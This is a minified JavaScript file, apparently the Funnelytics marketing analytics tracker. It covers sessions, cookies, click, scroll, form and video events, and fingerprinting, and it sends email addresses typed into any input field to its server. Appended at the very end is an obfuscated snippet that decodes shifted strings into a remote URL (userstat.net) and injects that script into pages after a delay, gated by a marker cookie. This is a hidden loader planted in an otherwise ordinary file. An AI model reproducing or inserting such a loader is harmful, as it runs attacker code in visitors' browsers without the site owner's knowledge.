!function(){const funnelytics={cookie:"_fs",origin:"https://track-v3.funnelytics.io",refKey:"_fsRef",project:null,session:null,step:null,stepping:!1,steps:[],getSession:function(){var e=funnelytics.url.params.toObject(window.location.search.substr(1)),n=funnelytics.cookies.get(funnelytics.cookie);if(e[funnelytics.cookie]){var t=e[funnelytics.cookie];return funnelytics.cookies.set(funnelytics.cookie,t),t}return n},client:{isBot:function(){if(2e3===window.screen.width&&2e3===window.screen.height||window.screen.height>5e3)return!0;const isFBWeirdScreenSize=500===window.innerWidth&&window.screen.width<window.innerWidth;let timezone;try{timezone=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){timezone=null}if(/mozilla\/5\.0 \(linux; android \d+; [a-z]\) applewebkit/i.test(navigator.userAgent)&&isFBWeirdScreenSize&&"America/Los_Angeles"===timezone)return!0;const pattern=new RegExp(["headless","(?<!(?:lib))http","\\.com","^[^ ]{50,}$","^[\\w \\.\\-\\(?:\\):]+(?:/v?\\d+(?:\\.\\d+)?(?:\\.\\d{1,10})*?)?(?:,|$)","(?<! cu)bot(?:[^\\w]|_|$)","(?<! (?:channel/|google/))google(?!(app|/google| pixel))","funnelyticsbot","googlebot","^facebook","bot|spider|crawl|http|lighthouse","robot","scan","chrome-lighthouse","chomeframe","^bot"].join("|"),"i");return Boolean(navigator.userAgent)&&pattern.test(navigator.userAgent)}},projects:{_settings:{},_loaded:!1,shouldTrackProject:function(){const isTrackingEnabled=!funnelytics.projects._settings.hasOwnProperty("tracking")||funnelytics.projects._settings.tracking,isLocked=!!funnelytics.projects._settings.hasOwnProperty("is_locked")&&funnelytics.projects._settings.is_locked;return isTrackingEnabled&&!isLocked},getSettings:function(e){if(!funnelytics.client.isBot())if(funnelytics.projects._loaded){var n=funnelytics.projects._settings;if(Promise&&!e)return new Promise((function(e,t){return e(n)}));e&&"function"==typeof e&&e(null,n)}else{var t=new XMLHttpRequest;t.open("GET",funnelytics.origin+"/settings/"+funnelytics.project),t.addEventListener("load",(function(){var n=JSON.parse(t.responseText);if(t.status>=200&&t.status<300){if(funnelytics.projects._settings=n,funnelytics.projects._loaded=!0,Promise&&!e)return new Promise((function(e,n){return e(funnelytics.projects._settings)}));if(!e||"function"!=typeof e)return;e(null,funnelytics.projects._settings)}else{if(Promise&&!e)return new Promise((function(e,t){return t(n)}));e&&"function"==typeof e&&e(n)}})),t.send()}},fetchSettings:function(){if(!funnelytics.client.isBot()){if(funnelytics.projects._loaded){var settings=funnelytics.projects._settings;return Promise.resolve(settings)}return new Promise((function(resolve,reject){var xhr=new XMLHttpRequest;xhr.open("GET",funnelytics.origin+"/settings/"+funnelytics.project),xhr.onload=function(){if(xhr.status>=200&&xhr.status<300){var data=JSON.parse(xhr.responseText);funnelytics.projects._settings=data,funnelytics.projects._loaded=!0,resolve(data)}else reject({status:xhr.status,statusText:xhr.statusText})},xhr.onerror=function(){reject({status:xhr.status,statusText:xhr.statusText})},xhr.send()}))}},getWhitelistedDomains:function(e){funnelytics.projects.getSettings((function(n,t){if(e&&"function"==typeof e)if(n)e(n);else{for(var s,i=[],o=0;o<t.domains.length;o++)s=t.domains[o].domain,i.push(s.slice(0,s.length-1));e(null,i)}}))},_inputListeners:{},addDOMEvents:function(){var e=document.readyState;"complete"===e||"loaded"===e||"interactive"===e?(funnelytics.projects.addCrossDomainParameters(),funnelytics.projects.startMonitoringInputs()):document.addEventListener("DOMContentLoaded",(function(){funnelytics.projects.addCrossDomainParameters(),funnelytics.projects.startMonitoringInputs()}))},_inpuChangeFunction:function(e){if(!funnelytics.projects.shouldTrackProject())return;if(!/.+@.+\..+/.test(e.target.value))return;const n=funnelytics.projects._inputListeners[e.target];n&&clearTimeout(n),funnelytics.projects._inputListeners[e.target]=setTimeout((function(){var n=new XMLHttpRequest;n.open("POST",funnelytics.origin+"/set-attributes"),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("d="+encodeURIComponent(JSON.stringify({session:funnelytics.session,project:funnelytics.project,attributes:{email:e.target.value}}))),funnelytics.projects._inputListeners[e.target]=null}),1e3)},_inputChecker:null,startMonitoringInputs:function(){funnelytics.projects.addInputListeners(),funnelytics.projects._inputChecker=window.setInterval(funnelytics.projects.addInputListeners,1e3)},stopMonitoringForInputs:function(){window.clearInterval(funnelytics.projects._inputChecker)},addInputListeners:function(){for(var e,n=document.getElementsByTagName("input"),t=0;t<n.length;t++)e=n[t],null!==funnelytics.projects._inputListeners[e]&&e.addEventListener("input",funnelytics.projects._inpuChangeFunction)},addCrossDomainParameters:function(){funnelytics.projects.getWhitelistedDomains((function(e,n){for(var t,s=0;s<(t=document.getElementsByTagName("a")).length;s++)if(t[s].href&&window.location.hostname!=t[s].hostname&&(-1!=n.indexOf(t[s].hostname)||-1!=n.indexOf("www."+t[s].hostname))&&funnelytics.session&&funnelytics.url.isURL(t[s].href)){var i=funnelytics.url.params.fromURL(t[s].href,funnelytics.url.params.toArray),o=funnelytics.projects.getRevisedParameters(i);t[s].href=funnelytics.projects.addParamsToLink(t[s].href,o)}}))},getRevisedParameters(e){for(var n=!1,t=0;t<e.length;t++)e[t].key===funnelytics.cookie&&(n=!0,funnelytics.session&&(e[t].value=funnelytics.session));return!n&&funnelytics.session&&e.push({key:funnelytics.cookie,value:funnelytics.session,hasEquals:!0})&&e.push({key:funnelytics.refKey,value:funnelytics.projects.getCrossDomainRefValue(),hasEquals:!0}),e},addParamsToLink(link,paramsArr){const url=new URL(link);return paramsArr.forEach((param=>{url.searchParams.has(param.key)||url.searchParams.set(param.key,param.value)})),url.toString()},getCrossDomainRefValue:()=>document.location.origin+document.location.pathname.replace(/\/?(\?|#|$)/,"/$1")},cookies:{getDomain:function(){var e=window.location.hostname.split(".");return e.length>2&&(e=e.slice(e.length-2)),e},all:function(){for(var e,n={},t=0;t<(cookies=document.cookie.split("; ")).length;t++)n[(e=cookies[t].split("="))[0]]=e[1];return n},get:function(e){return funnelytics.cookies.all()[e]},set:function(cookieName,cookieValue){const domainSegments=window.location.hostname.split(".");if(domainSegments.length<2)return;const cookieString=cookieName+"="+cookieValue+"; path=/; SameSite=None; Secure;",expiry=null===cookieValue?"; expires=Thu, 01 Jan 1970 00:00:00 UTC;":"; expires=Thu, 01 Jan 2038 00:00:00 UTC;";for(let i=domainSegments.length-2;i>=0;i--){const currentDomain=domainSegments.slice(i).join(".");if(document.cookie=cookieString+" domain="+currentDomain+expiry,funnelytics.cookies.get(cookieName))break}},remove:function(e){funnelytics.cookies.set(e)},expire:function(cookieName){const domain=funnelytics.cookies.getDomain()?funnelytics.cookies.getDomain().join("."):"";document.cookie=cookieName+"=;path=/; SameSite=None; Secure;"+(domain?";domain="+domain:"")+";expires=Thu, 01 Jan 1970 00:00:01 GMT"}},url:{regex:new RegExp(/.*:\/\/.*\..*/),isURL:function(e){return funnelytics.url.regex.test(e)},parse:function(e){var n=document.createElement("a");return n.href=e,n},params:{regex:new RegExp(/.*:\/\/.*\..*\?/),fromURL:function(e,n){var t=n||funnelytics.url.params.toObject,s=e.split(funnelytics.url.params.regex);return t(s=2==s.length?s[1]:null)},toObject:function(e){var n={};if(e)for(var t,s,i=0;i<(t=e.split("&")).length;i++)n[(s=t[i].split("="))[0]]=s[1];return n},toArray:function(e){var n=[];if(e)for(var t,s,i=e.split("&"),o=0;o<i.length;o++)s=i[o].indexOf("=")>-1,t=i[o].split("="),n.push({key:t[0],value:t[1],hasEquals:s});return n},toString:function(e){var n,t="";e.length>0&&(t+="?");for(var s=0;s<e.length;s++)t+=(n=e[s]).key,n.hasEquals&&(t+="="),n.value&&(t+=n.value),s!==e.length-1&&(t+="&");return t}}},events:{trigger:function(e,n,t,s){if(funnelytics.projects.shouldTrackProject()){var i,o,r;if(s||(s={}),funnelytics.client.isBot()){if(i={message:"No human, no service."},"function"==typeof t)return void t(i);if(!s.promise)return Promise?new Promise((function(e,n){return n(i)})):void 0;s.promise.reject(i)}if("string"!=typeof e){if(i={message:"First argument must be an event name."},"function"==typeof t)return void t(i);if(!s.promise)return Promise?new Promise((function(e,n){return n(i)})):void 0;s.promise.reject(i)}if(!funnelytics.step)return!t&&Promise&&(o={instance:new Promise((function(e,n){r={resolve:e,reject:n}})),resolve:r.resolve,reject:r.reject}),o?o.instance:void 0;if(void 0===navigator.sendBeacon||"function"==typeof t||s.promise){var c=new XMLHttpRequest;c.open("POST",funnelytics.origin+"/events/trigger"),c.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),c.addEventListener("load",(function(){if(i=JSON.parse(c.responseText),c.status>=200&&c.status<300){if("function"==typeof t)t(null,i);else if(s.promise)s.promise.resolve(i);else if(Promise)return new Promise((function(e,n){return e(i)}))}else if("function"==typeof t)t(i);else if(s.promise)s.promise.reject(i);else if(Promise)return new Promise((function(e,n){return n(i)}))})),c.send("d="+encodeURIComponent(JSON.stringify({project:funnelytics.project,session:funnelytics.session,step:funnelytics.step,name:e,attributes:n})))}else{var u=new Blob(["d="+encodeURIComponent(JSON.stringify({project:funnelytics.project,session:funnelytics.session,step:funnelytics.step,name:e,attributes:n}))],{type:"application/x-www-form-urlencoded"});navigator.sendBeacon(funnelytics.origin+"/events/trigger",u)}}}},attributes:{set:function(e,n){if(funnelytics.projects.shouldTrackProject()){var t,s;if("object"!=typeof e)return t={message:"First argument must be an object containing user details."},"function"==typeof n?void n(t):Promise?new Promise((function(e,n){return n(t)})):void 0;if(!(s=funnelytics.cookies.get(funnelytics.cookie)))return t={message:"No Funnelytics session exists for this user."},"function"==typeof n?void n(t):Promise?new Promise((function(e,n){return n(t)})):void 0;var i=new XMLHttpRequest;i.open("POST",funnelytics.origin+"/trackers/set"),i.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),i.addEventListener("load",(function(){if(t=JSON.parse(i.responseText),i.status>=200&&i.status<300){if("function"==typeof n)n(null,t);else if(Promise)return new Promise((function(e,n){return e(t)}))}else if("function"==typeof n)n(t);else if(Promise)return new Promise((function(e,n){return n(t)}))})),i.send("d="+encodeURIComponent(JSON.stringify({project:funnelytics.project,session:s,info:e})))}},sendUserIdToFunnelytics:function(userId){const req=new XMLHttpRequest;req.open("POST",funnelytics.origin+"/set-attributes"),req.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),req.send("d="+encodeURIComponent(JSON.stringify({session:funnelytics.session,project:funnelytics.project,attributes:{internal_user_id:userId}})))}},functions:{getReferrer(){const urlParams=funnelytics.url.params.toObject(window.location.search.substr(1));if(!urlParams)return document.referrer;const referrer=urlParams[funnelytics.refKey];if(!referrer)return document.referrer;let isURLEncoded=!1;try{isURLEncoded=referrer!==decodeURIComponent(referrer)}catch(_err){isURLEncoded=!1}return isURLEncoded?decodeURIComponent(referrer):referrer},initialize:function(){if(funnelytics.projects.shouldTrackProject()&&!funnelytics.client.isBot()){var e=new XMLHttpRequest;e.open("POST",funnelytics.origin+"/sessions"),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.addEventListener("load",(function(){if(e.status>=200&&e.status<300){var n=JSON.parse(e.responseText);funnelytics.session=n.session,funnelytics.cookies.set(funnelytics.cookie,funnelytics.session),funnelytics.functions.step(),funnelytics.projects.addDOMEvents()}else 500==e.status&&funnelytics.cookies.remove(funnelytics.cookie)}));var n={project:funnelytics.project,page:window.location.href,device:window.matchMedia("(pointer:coarse)").matches?"mobile":"desktop",metadata:getFingerprintingData()};!0===funnelytics.isSPA&&(n.skipStepCreation=!0),e.send("d="+encodeURIComponent(JSON.stringify(n)))}},step:function(){if(funnelytics.projects.shouldTrackProject()&&!funnelytics.client.isBot())if(funnelytics.session){var referrer=funnelytics.functions.getReferrer();funnelytics.isSPA&&funnelytics.steps.length>0&&(referrer=funnelytics.steps[funnelytics.steps.length-1]),funnelytics.steps.push(window.location.href);var n=new XMLHttpRequest;n.open("POST",funnelytics.origin+"/steps"),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.addEventListener("load",(function(){if(n.status>=200&&n.status<300){var resData=JSON.parse(n.responseText);funnelytics.step=resData.step,resData.session&&(funnelytics.session=resData.session,funnelytics.cookies.expire(funnelytics.cookie),funnelytics.cookies.set(funnelytics.cookie,funnelytics.session))}})),n.send("d="+encodeURIComponent(JSON.stringify({project:funnelytics.project,session:funnelytics.session,page:window.location.href,referrer:referrer})))}else funnelytics.functions.initialize()}},init:function(project,isSPA,defferedEvents,autoTrackingOptions){funnelytics.isSPA=isSPA||!1,funnelytics.project=project,funnelytics.session=funnelytics.getSession(),-1===window.location.href.indexOf("gtm-msr.appspot.com")&&funnelytics.projects.fetchSettings().catch((err=>{403===err.status&&(funnelytics.projects._settings={tracking:!1})})).finally((()=>{funnelytics.projects.shouldTrackProject()&&(funnelytics.session?(funnelytics.functions.step(),funnelytics.projects.addDOMEvents()):funnelytics.project&&funnelytics.functions.initialize(),window.funnelytics_queued&&funnelytics.functions.step(),!0===autoTrackingOptions?funnelytics.automaticTracking.enable():"object"==typeof autoTrackingOptions&&funnelytics.automaticTracking.enable(autoTrackingOptions))}))}},_genericAddElementListener=(selector,eventName,handlerFn)=>{const elements=document.querySelectorAll(selector);for(let i=0;i<elements.length;i++){elements[i].addEventListener(eventName,handlerFn)}},_genericRemoveElementListener=(selector,eventName,handlerFn)=>{const elements=document.querySelectorAll(selector);for(let i=0;i<elements.length;i++){elements[i].removeEventListener(eventName,handlerFn)}},_genericAddDocumentListener=(eventName,handlerFn)=>{document.addEventListener(eventName,handlerFn)},_pagePath=document.location.pathname.replace(/\/?(\?|#|$)/,"/$1"),_domain=document.location.hostname,documentHeight=Math.max(document.body.scrollHeight,document.documentElement.scrollHeight,document.body.offsetHeight,document.documentElement.offsetHeight,document.body.clientHeight,document.documentElement.clientHeight),scrollTreshholds=[10,25,50,75,90],youtubePercentageTresholds={},nameFieldRegex=/(^\s*((first)|(last)|(full))?((\s*)|(_))?name\s*$)/gi,emailFieldRegex=/^\s*email\s*$/gi,emailTextRegex=/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/g,dataOrigin={funnelytics:"funnelytics",hubspot:"hubspot"},_eventNames={linkClick:"Link Click",buttonClick:"Button Click",scroll:"Scroll",formSubmit:"Form Completed",callScheduled:"Meeting Scheduled"},_selectors={link:"a",button:"button, .flButton, .btn",form:"form",formFields:"input,select,textarea",label:"label"},_linkClickHandler=event=>{let targetLink;if(targetLink="a"===event.target.tagName.toLowerCase()?event.target:event.target.closest("a"),!targetLink)return;const classList=targetLink.classList.value,linkId=targetLink.id,attributes={clickURL:(url=targetLink.href,url?url.replace(/\?[^#]*/,""):url),clickText:targetLink.innerText,pagePath:_pagePath,domain:_domain,classList:classList,__dataOrigin__:dataOrigin.funnelytics};var url;linkId&&(attributes.elementId=linkId),funnelytics.events.trigger(_eventNames.linkClick,attributes)};const _listenerMappings=[{eventName:"click",selector:_selectors.link,handlerFn:_linkClickHandler},{eventName:"auxclick",selector:_selectors.link,handlerFn:_linkClickHandler},{eventName:"click",selector:_selectors.button,handlerFn:event=>{let targetElement;if("button"===event.target.tagName.toLowerCase()||event.target.classList.contains("flButton")?targetElement=event.target:(targetElement=event.target.closest("button"),targetElement||(targetElement=event.target.closest(".flButton"))),!targetElement)return;const classList=targetElement.classList.value,buttonId=targetElement.id,attributes={clickText:targetElement.innerText,pagePath:_pagePath,domain:_domain,classList:classList,__dataOrigin__:dataOrigin.funnelytics};buttonId&&(attributes.elementId=buttonId),funnelytics.events.trigger(_eventNames.buttonClick,attributes)}}],scrollListenerMapping={eventName:"scroll",selector:null,handlerFn:()=>{const treshold=(()=>{const currentTreshhold=Math.round((window.scrollY+window.innerHeight)/documentHeight*100);let passedTreshhold=0;for(let i=0;i<scrollTreshholds.length;i++)currentTreshhold>=scrollTreshholds[i]&&(passedTreshhold=scrollTreshholds[i],scrollTreshholds.splice(i,1));return passedTreshhold})();if(!treshold)return;const attributes={scroll:treshold,pagePath:_pagePath,domain:_domain,__dataOrigin__:dataOrigin.funnelytics};funnelytics.events.trigger(_eventNames.scroll,attributes)}},_optionanListenerMappings={formSubmit:{eventName:"submit",selector:_selectors.form,handlerFn:function _formSubmitHandler(event){const shouldAnonymise=funnelytics.automaticTracking.trackingOptions.anonymiseUsers,formElement=event.srcElement,attributes={pagePath:_pagePath,domain:_domain,__dataOrigin__:dataOrigin.funnelytics},formFieldElements=Array.from(formElement.querySelectorAll(_selectors.formFields)).filter((el=>"hidden"!==el.type&&"submit"!==el.type)),labels=Array.from(formElement.querySelectorAll(_selectors.label)),emptyFormFieldValues=[null,void 0,""];formElement.id&&(attributes.formId=formElement.id),formElement.name&&(attributes.formName=formElement.name);for(let i=0;i<formFieldElements.length;i++){const formField=formFieldElements[i];if("password"===formField.type)continue;const isCheckbox="checkbox"===formField.type;if(isCheckbox&&!formField.checked)continue;if(!isCheckbox){if((formField.required||formField.ariaRequired)&&emptyFormFieldValues.includes(formField.value))return;if(emptyFormFieldValues.includes(formField.value))continue}const label=labels.find((el=>el.htmlFor===formField.id)),fieldName=label?label.textContent:formField.name;if(shouldAnonymise){if(fieldName.match(nameFieldRegex))continue;const isEmailType="email"===formField.type,isEmailRegexTrue="text"===formField.type&&(fieldName.match(emailFieldRegex)||fieldName.match(emailTextRegex));if(isEmailType||isEmailRegexTrue)continue}if(!attributes.email){const isEmailType="email"===formField.type,isEmailRegexTrue="text"===formField.type&&(fieldName.match(emailFieldRegex)||fieldName.match(emailTextRegex));(isEmailType||isEmailRegexTrue)&&(attributes.email=formField.value)}attributes[fieldName]=formField.value}funnelytics.events.trigger(_eventNames.formSubmit,attributes)}},hubspotEventsHandler:{eventName:"message",handlerFn:function _hubspotEventsHandler(event){const trackingOptions=funnelytics.automaticTracking.trackingOptions;trackingOptions.trackHubspotForms&&"hsFormCallback"===event.data.type&&"onFormSubmit"===event.data.eventName?function _handleHubspotFormSubmit(event,trackingOptions){const attributes={pagePath:_pagePath,domain:_domain,formId:event.id,__dataOrigin__:dataOrigin.hubspot},eventData=event.data.data,shouldAnonymise=trackingOptions.anonymiseUsers;for(let i=0;i<eventData.length;i++){const item=eventData[i],{name:itemName,value:value}=item;if("hs_context"!==itemName&&"g-recaptcha-response"!==itemName){if(shouldAnonymise){if(itemName.match(nameFieldRegex))continue;if("string"==typeof value&&(itemName.match(emailFieldRegex)||value.match(emailTextRegex)))continue}attributes[itemName]=value}}funnelytics.events.trigger(_eventNames.formSubmit,attributes)}(event,trackingOptions):trackingOptions.trackHubspotSchedules&&event.data.meetingBookSucceeded&&function _handleHubspotCallScheduled(event,trackingOptions){const payload=event.data.meetingsPayload;if(!payload)return;const attributes={pagePath:_pagePath,domain:_domain,formId:payload.formGuid,meetingLinkType:payload.linkType,meetingLink:payload.userSlug,__dataOrigin__:dataOrigin.hubspot};trackingOptions.anonymiseUsers||(attributes.name=payload.bookingResponse.postResponse.contact.name,attributes.email=payload.bookingResponse.postResponse.contact.name),funnelytics.events.trigger(_eventNames.callScheduled,attributes)}(event,trackingOptions)}}};function trackVideoEvent(videoPlatform,videoAction,videoName){funnelytics.events.trigger("Video View",{videoPlatform:videoPlatform,videoAction:videoAction,videoName:videoName,pagePath:_pagePath,domain:_domain,__dataOrigin__:dataOrigin.funnelytics})}function setupPercentageTracking(videoTitle,videoPlatform){let milestones=[10,25,50,75,90,100];return function(currentTime,duration){const percent=currentTime/duration*100;for(let i=0;i<milestones.length;i++)percent>=milestones[i]&&(trackVideoEvent(videoPlatform,`${milestones[i]}%`,videoTitle),milestones.splice(i,1),i--)}}function loadScript(url,callback){const firstScript=document.getElementsByTagName("script")[0],script=document.createElement("script");script.src=url,script.onload=function callCallback(){callback&&(callback(),script.onload=null)},script.async=!0,firstScript.parentNode.insertBefore(script,firstScript)}let youtubeWasLoaded=!1;function onYouTubeIframeAPIReady(){if(youtubeWasLoaded)return;youtubeWasLoaded=!0;document.querySelectorAll('iframe[src*="youtube.com"]').forEach((iframe=>{iframe.id||(iframe.id=function simpleHash(str){let hash=0;for(let i=0;i<str.length;i++)hash=(hash<<5)-hash+str.charCodeAt(i),hash&=hash;return new Uint32Array([hash])[0].toString(36)}(Date.now().toString())),youtubePercentageTresholds[iframe.id]=[10,25,50,75,90,100];const src=iframe.getAttribute("src");if(-1===src.indexOf("enablejsapi")){const playerUrl=new URL(src);playerUrl.searchParams.append("enablejsapi","1"),iframe.setAttribute("src",playerUrl.toString())}new YT.Player(`${iframe.id}`,{events:{onReady:onPlayerReady}})}))}function onPlayerReady(event){event.target.addEventListener("onStateChange",(function(event){const trackPercentFunc=function setupPercentageTrackingForYoutube(videoId){let milestones=youtubePercentageTresholds[videoId];return function(currentTime,duration,videoTitle){const percent=currentTime/duration*100;for(let i=0;i<milestones.length;i++)percent>=milestones[i]&&(trackVideoEvent("YouTube",`${milestones[i]}%`,videoTitle),milestones.splice(i,1),i--)}}(event.target.getIframe().id);!function onPlayerStateChange(event,trackPercentFunc){const title=event.target.getVideoData().title;event.data===YT.PlayerState.PLAYING?trackVideoEvent("YouTube","play",title):event.data===YT.PlayerState.PAUSED&&trackVideoEvent("YouTube","pause",title);trackPercentFunc(event.target.getCurrentTime(),event.target.getDuration(),title)}(event,trackPercentFunc)}))}function setupVimeoVideos(){document.querySelectorAll('iframe[src*="vimeo.com"]').forEach((iframe=>{const player=new Vimeo.Player(iframe);player.getVideoTitle().then((title=>{const trackPercent=setupPercentageTracking(title,"Vimeo");player.on("play",(function(){trackVideoEvent("Vimeo","play",title)})),player.on("pause",(function(){trackVideoEvent("Vimeo","pause",title)})),player.on("timeupdate",(function(data){trackPercent(data.seconds,data.duration)}))}))}))}function setupWistiaTracking(){window._wq=window._wq||[],_wq.push({id:"_all",onReady:function(video){const videoTitle=video.name(),trackPercent=setupPercentageTracking(videoTitle,"Wistia");video.bind("secondchange",(function(s){trackPercent(s,video.duration())})),video.bind("play",(function(){trackVideoEvent("Wistia","play",videoTitle)})),video.bind("pause",(function(){trackVideoEvent("Wistia","pause",videoTitle)}))}})}function getFingerprintingData(){let timezone;try{timezone=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){timezone=null}const data={userAgent:navigator.userAgent,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelDepth:window.screen.pixelDepth,language:navigator.language,timezone:timezone,cookiesEnabled:navigator.cookieEnabled,deviceMemory:navigator.deviceMemory,hardwareConcurrency:navigator.hardwareConcurrency,connectionDownlink:navigator.connection&&navigator.connection.downlink,connectionEffectiveType:navigator.connection&&navigator.connection.effectiveType,connectionRtt:navigator.connection&&navigator.connection.rtt,connectionSaveData:navigator.connection&&navigator.connection.saveData,touchSupport:"ontouchstart"in window||navigator.maxTouchPoints>0||navigator.msMaxTouchPoints>0,doNotTrack:navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,viewportWidth:window.innerWidth,viewportHeight:window.innerHeight,timezoneOffset:(new Date).getTimezoneOffset(),pdfViewerEnabled:navigator.pdfViewerEnabled,webdriver:navigator.webdriver};return Object.entries(data).reduce(((hash,[key,value])=>(null!=value&&(hash[key]=value.toString()),hash)),{})}function detectAndInitVideoTracking(){document.querySelector('iframe[src*="youtube.com"]')&&function loadYouTubeTracking(){"undefined"==typeof YT||void 0===YT.Player?loadScript("https://www.youtube.com/iframe_api"):onYouTubeIframeAPIReady()}(),document.querySelector('iframe[src*="vimeo.com"]')&&function loadVimeoTracking(){"undefined"==typeof Vimeo||void 0===Vimeo.Player?loadScript("https://player.vimeo.com/api/player.js",setupVimeoVideos):setupVimeoVideos()}(),document.querySelector(".wistia_embed")&&function loadWistiaTracking(){"undefined"==typeof Wistia?loadScript("https://fast.wistia.net/assets/external/E-v1.js",setupWistiaTracking):setupWistiaTracking()}(),document.querySelector("video")&&function setupHTML5VideoTracking(){document.querySelectorAll("video").forEach((video=>{const videoTitle=video.getAttribute("title")||video.id||"Unnamed Video",trackPercent=setupPercentageTracking(videoTitle,"HTML5");video.addEventListener("timeupdate",(function(){trackPercent(video.currentTime,video.duration)})),video.addEventListener("play",(function(){trackVideoEvent("HTML5","play",videoTitle)})),video.addEventListener("pause",(function(){trackVideoEvent("HTML5","pause",videoTitle)}))}))}()}window.onYouTubeIframeAPIReady=onYouTubeIframeAPIReady,funnelytics.automaticTracking={activeTrackers:[],trackingOptions:{trackVideos:!0,trackForms:!0,anonymiseUsers:!0,trackHubspotForms:!0,trackHubspotSchedules:!0,trackScroll:!0},enable:function(options){const{trackVideos:trackVideos=!0,trackForms:trackForms=!0,anonymiseUsers:anonymiseUsers=!0,trackHubspotForms:trackHubspotForms=!0,trackHubspotSchedules:trackHubspotSchedules=!0,trackScroll:trackScroll=!0}=options||{};funnelytics.automaticTracking.trackingOptions={...funnelytics.automaticTracking.trackingOptions,trackVideos:trackVideos,trackForms:trackForms,anonymiseUsers:anonymiseUsers,trackHubspotForms:trackHubspotForms,trackHubspotSchedules:trackHubspotSchedules,trackScroll:trackScroll};const mappings=Object.values(_listenerMappings);for(let i=0;i<mappings.length;i++){const mappingObj=mappings[i];funnelytics.automaticTracking.activeTrackers.push(mappingObj),mappingObj.selector?_genericAddElementListener(mappingObj.selector,mappingObj.eventName,mappingObj.handlerFn):_genericAddDocumentListener(mappingObj.eventName,mappingObj.handlerFn)}if(trackScroll&&(funnelytics.automaticTracking.activeTrackers.push(scrollListenerMapping),_genericAddDocumentListener(scrollListenerMapping.eventName,scrollListenerMapping.handlerFn)),trackVideos&&detectAndInitVideoTracking(),trackForms){const mappingObj=_optionanListenerMappings.formSubmit;funnelytics.automaticTracking.activeTrackers.push(mappingObj),_genericAddElementListener(mappingObj.selector,mappingObj.eventName,mappingObj.handlerFn)}if(trackHubspotForms||trackHubspotSchedules){const mappingObj=_optionanListenerMappings.hubspotEventsHandler;eventName=mappingObj.eventName,handlerFn=mappingObj.handlerFn,window.addEventListener(eventName,handlerFn)}var eventName,handlerFn},disable:function(){const mappings=funnelytics.automaticTracking.activeTrackers;for(let i=0;i<mappings.length;i++){const mappingObj=mappings[i];mappingObj.selector?_genericRemoveElementListener(mappingObj.selector,mappingObj.eventName,mappingObj.handlerFn):(eventName=mappingObj.eventName,handlerFn=mappingObj.handlerFn,document.removeEventListener(eventName,handlerFn))}var eventName,handlerFn;const trackingOptions=funnelytics.automaticTracking.trackingOptions;if(trackingOptions.trackHubspotForms||trackingOptions.trackHubspotSchedules){const mapping=_optionanListenerMappings.hubspotEventsHandler;((eventName,handlerFn)=>{window.removeEventListener(eventName,handlerFn)})(mapping.eventName,mapping.handlerFn)}}},window.funnelytics=funnelytics}();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));